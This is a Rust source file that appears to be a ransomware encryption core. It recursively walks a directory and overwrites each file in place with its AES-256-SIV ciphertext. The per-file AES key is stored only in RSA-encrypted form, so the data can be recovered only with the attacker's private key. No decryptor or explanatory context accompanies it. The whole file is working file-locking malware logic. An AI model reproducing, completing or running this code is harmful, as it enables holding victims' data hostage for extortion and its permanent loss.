use aes_siv::{
    aead::{generic_array::GenericArray, Aead, KeyInit, OsRng},
    Aes256SivAead,
    Error as AesError,
    Nonce, // Or `Aes128SivAead`
};
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use rsa::{errors::Error as RsaError, pkcs8::DecodePublicKey, Oaep, PublicKey, RsaPublicKey};

use sha2::Sha256;

use std::io::{Error as IOError, Read};
use std::path::Path;
use std::fs::{File , write};
use thiserror::Error;
use typenum::consts::U16;
use typenum::{UInt, UTerm, B0, B1};
use walkdir::WalkDir;

type _KeyType =
    GenericArray<u8, UInt<UInt<UInt<UInt<UInt<UInt<UInt<UTerm, B1>, B0>, B0>, B0>, B0>, B0>, B0>>;

#[derive(Error, Debug)]
enum CipherError {
    #[error("IO error")]
    IOError(#[from] IOError),
    #[error("Aes encryption Error")]
    AesError(AesError),
    #[error("Rsa encryption Error")]
    RsaError(#[from] RsaError),
}

fn gen_rand_nonce() -> GenericArray<u8, U16> {
    let rand_string: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    Nonce::clone_from_slice(rand_string.as_bytes()) // 128-bits; unique per message
}

fn encrypt_file(
    path: &Path,
    rsa_key: &RsaPublicKey,
) -> Result<(), CipherError> {

    match File::options().write(true).read(true).open(path) {
        Ok(mut file) => {

            let (aes_key, cipher) = gen_aes_key_cipher();
            let nonce = gen_rand_nonce(); // 128-bits; unique per message
        
            let mut rng = rand::thread_rng();
            let padding = Oaep::new::<Sha256>();
        
            let aes_encrypted_key = rsa_key.encrypt(&mut rng, padding, aes_key.as_slice());

            if let Err(error) = aes_encrypted_key {
                return Err(CipherError::RsaError(error));
            }
        
            let aes_encrypted_key = aes_encrypted_key.unwrap();

            let mut buffer = Vec::<u8>::new();
            file.read_to_end(&mut buffer)?;

            let encrypted = cipher.encrypt(&nonce, buffer.as_ref());

            if let Err(error) = encrypted {
                return Err(CipherError::AesError(error));
            }

            let encrypted = encrypted.unwrap();
            
            let mut data_to_write =  vec![];
            data_to_write.extend_from_slice(nonce.as_slice());
            data_to_write.extend_from_slice(&encrypted);
            data_to_write.extend_from_slice(&aes_encrypted_key);

            Ok(write(path , data_to_write)?)
        }
        Err(error) => Err(CipherError::IOError(error)),
    }
}

fn gen_aes_key_cipher() -> (_KeyType, Aes256SivAead) {
    let key: _KeyType = Aes256SivAead::generate_key(&mut OsRng);
    let cipher = Aes256SivAead::new(&key);

    (key, cipher)
}

fn main() {
    // Initialize RSA public key
    let path_rsa: &str = "./public_key.pem";
    let rsa_key = RsaPublicKey::read_public_key_pem_file(path_rsa).expect("no rsa key");

    for entry in WalkDir::new("./some_target_dir")
        .into_iter()
        .filter_map(|e| e.ok())
    {
        if entry.metadata().unwrap().is_file() {
            let path = entry.path();

            encrypt_file(path, &rsa_key).ok();
        }
    }
}
